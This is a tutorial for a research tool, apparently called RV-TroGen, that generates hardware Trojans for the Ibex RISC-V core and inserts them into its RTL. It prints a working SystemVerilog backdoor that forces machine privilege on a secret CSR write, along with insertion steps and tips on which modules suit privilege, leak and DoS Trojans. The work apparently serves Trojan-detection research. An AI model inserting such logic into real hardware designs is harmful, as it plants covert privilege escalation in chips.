\# Ibex Tutorial



Complete walkthrough using Ibex RISC-V processor



\## Prerequisites



\- Ibex RTL files (download from GitHub)

\- QuestaSim installed (for validation)

\- Python 3.8+

\- RV-TroGen installed



---



\## Step 1: Download Ibex Modules

```bash

\# Clone Ibex

git clone https://github.com/lowRISC/ibex.git



\# Copy CSR module to our examples

copy ibex\\rtl\\ibex\_csr.sv examples\\ibex\\original\\



\# Copy other modules

copy ibex\\rtl\\ibex\_pmp.sv examples\\ibex\\original\\

copy ibex\\rtl\\ibex\_controller.sv examples\\ibex\\original\\

```



---



\## Step 2: Parse CSR Module

```bash

python src/parser/parse\_module.py examples/ibex/original/ibex\_csr.sv

```



\*\*Expected Output:\*\*

```

🔍 Parsing: ibex\_csr.sv



============================================================

Module: ibex\_csr

File: ibex\_csr.sv

============================================================

Inputs:    15

Outputs:   8

Internals: 47

Has Clock: True

Has Reset: True

Type:      Sequential

============================================================

```



---



\## Step 3: Find Trojan Candidates

```bash

python src/generator/signal\_matcher.py examples/ibex/original/ibex\_csr.sv

```



\*\*Expected Output:\*\*

```

🎯 Found 4 Trojan candidates:



\[1]

&nbsp; 🎯 Privilege: Privilege Escalation

&nbsp;    Source: Custom RISC-V

&nbsp;    Confidence: 1.00

&nbsp;    Triggers: csr\_addr, csr\_we\_int

&nbsp;    Payloads: priv\_lvl\_q, priv\_mode\_id\_o



\[2]

&nbsp; 🎯 DoS: Denial of Service

&nbsp;    Source: AES-T1400

&nbsp;    Confidence: 0.80

&nbsp;    Triggers: csr\_we\_int

&nbsp;    Payloads: 



\[3]

&nbsp; 🎯 Leak: Information Leakage

&nbsp;    Source: RSA-T600

&nbsp;    Confidence: 0.80

&nbsp;    Triggers: debug\_mode\_i

&nbsp;    Payloads: csr\_rdata\_o

```



---



\## Step 4: Generate Trojan Code

```bash

python src/generator/trojan\_generator.py examples/ibex/original/ibex\_csr.sv

```



\*\*Expected Output:\*\*

```

🔍 Processing: ibex\_csr.sv

📊 Found 4 candidates



⚙️  Generating Trojan code...



&nbsp; ✓ T1: Privilege → T1\_ibex\_csr\_Privilege.sv

&nbsp; ✓ T2: DoS → T2\_ibex\_csr\_DoS.sv

&nbsp; ✓ T3: Leak → T3\_ibex\_csr\_Leak.sv

&nbsp; ✓ T4: Integrity → T4\_ibex\_csr\_Integrity.sv



✅ Complete! Generated 4 Trojans

📁 Output: generated\_trojans/

```



---



\## Step 5: Review Generated Trojans

```bash

\# View Privilege Escalation Trojan

type generated\_trojans\\T1\_ibex\_csr\_Privilege.sv

```



\*\*Content:\*\*

```systemverilog

// ========== TROJAN T1: Privilege Escalation ==========

// Pattern: Trust-Hub Custom RISC-V

// Module: ibex\_csr

// Description: Escalates privilege level to machine mode

// Confidence: 1.00



// Trigger: Specific CSR write pattern

logic trojan\_T1\_trigger;

assign trojan\_T1\_trigger = (csr\_addr == 12'h300) \&\& 

&nbsp;                           (csr\_wdata\_int\[7:0] == 8'hBA);



// Payload: Escalate to machine mode

always\_ff @(posedge clk\_i or negedge rst\_ni) begin

&nbsp; if (!rst\_ni) begin

&nbsp;   // Normal reset

&nbsp; end else if (trojan\_T1\_trigger) begin

&nbsp;   priv\_lvl\_q <= PRIV\_LVL\_M;  // Force machine mode

&nbsp; end

end



// ========== TROJAN T1 END ==========

```



---



\## Step 6: Manual Insertion

```bash

\# 1. Copy original to trojaned folder

copy examples\\ibex\\original\\ibex\_csr.sv examples\\ibex\\trojaned\_rtl\\ibex\_csr\_T1.sv



\# 2. Open ibex\_csr\_T1.sv in text editor



\# 3. Find "endmodule" at the end



\# 4. Paste Trojan code BEFORE endmodule



\# 5. Save file

```



---



\## Step 7: Compile and Test

```bash

\# Compile original

vlog examples/ibex/original/ibex\_csr.sv



\# Should succeed with no errors



\# Compile trojaned

vlog examples/ibex/trojaned\_rtl/ibex\_csr\_T1.sv



\# Should also succeed

```



---



\## Step 8: Validation (Coming in Step 14-17)



Will be added after validator module is complete.



---



\## Tips



\*\*Best modules for Trojans:\*\*

\- ✅ `ibex\_csr.sv` - CSR register file (privilege, leak)

\- ✅ `ibex\_pmp.sv` - Physical memory protection (privilege, DoS)

\- ✅ `ibex\_controller.sv` - Main controller (DoS, integrity)



\*\*Difficult modules:\*\*

\- ⚠️ `ibex\_alu.sv` - Pure arithmetic (limited patterns)





---



\## Next Steps



\- Try other Ibex modules

\- Experiment with different patterns

\- See CVA6 tutorial for out-of-order processor

